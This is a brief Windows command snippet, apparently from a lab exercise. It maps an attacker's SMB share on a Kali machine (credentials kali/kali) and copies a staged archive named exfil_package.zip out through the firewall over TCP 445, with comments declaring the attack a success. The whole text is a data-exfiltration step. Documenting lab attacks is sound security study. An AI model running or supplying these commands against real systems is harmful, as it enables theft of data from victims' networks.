# Exfiltrate the staged archive to the Kali SMB share
# Run this on the Windows 10 victim (192.168.56.104) after setting up the Kali server

# Map the attacker share
net use Z: \\192.168.57.10\smb_share /user:kali kali

# Copy the archive across the firewall
copy C:\Users\vagrant.WINDOMAIN\Documents\exfil_package.zip Z:\

# At this point the attack has succeeded. The file crossed the firewall from LAN to WAN over TCP 445.
# Verified from screenshots: copy_over_smb.png, file_transfer_verified.png
